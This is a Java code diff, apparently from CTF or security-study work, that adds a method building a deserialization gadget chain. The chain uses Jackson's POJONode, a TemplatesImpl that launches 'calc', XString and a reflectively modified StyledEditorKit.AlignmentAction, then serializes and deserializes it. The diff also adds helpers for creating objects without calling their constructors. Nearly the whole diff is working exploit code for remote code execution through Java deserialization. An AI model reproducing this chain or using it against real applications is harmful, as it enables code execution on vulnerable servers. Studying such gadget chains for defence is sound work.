@@ -103,6 +103,28 @@ public class Test {
         deserial(serial(alignmentAction));
 
     }
+
+      //Boogipop的代码，看到别人几乎都用的是这个
+      public static void pop(){
+        POJONode pojoNode = new POJONode(SerializeUtils.getTemplate("calc"));
+        XString xstr = new XString("");
+        StyledEditorKit.AlignmentAction action = createWithoutConstructor(StyledEditorKit.AlignmentAction.class);
+        SerializeUtils.setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));
+        action.putValue("p1", "");
+        action.putValue("p2", "");
+        Field tablefield = AbstractAction.class.getDeclaredField("arrayTable");
+        tablefield.setAccessible(true);
+        Object atable = tablefield.get(action);
+        Field tablefield1 = atable.getClass().getDeclaredField("table");
+        tablefield1.setAccessible(true);
+        Object[] table1 = (Object[])tablefield1.get(atable);
+        table1[1] = xstr;
+        table1[3] = pojoNode;
+        tablefield1.set(atable, table1);
+        SerializeUtils.base64deserial(SerializeUtils.base64serial(action));
+      }
+
+      
     public static Field getField(final Class<?> clazz, final String fieldName) {
         Field field = null;
         try {
@@ -163,6 +185,19 @@ public class Test {
         RestTemplate restTemplate = new RestTemplate();
         ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
         System.out.println(res.getBody());
+    }
+    public static Object createWithoutConstructor(String classname) throws Exception {
+        return createWithoutConstructor(Class.forName(classname));
+    }
+    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws Exception {
+        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
+    }
+    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
+        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
+        objCons.setAccessible(true);
+        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
+        sc.setAccessible(true);
+        return (T) sc.newInstance(consArgs);
     }
 
 }
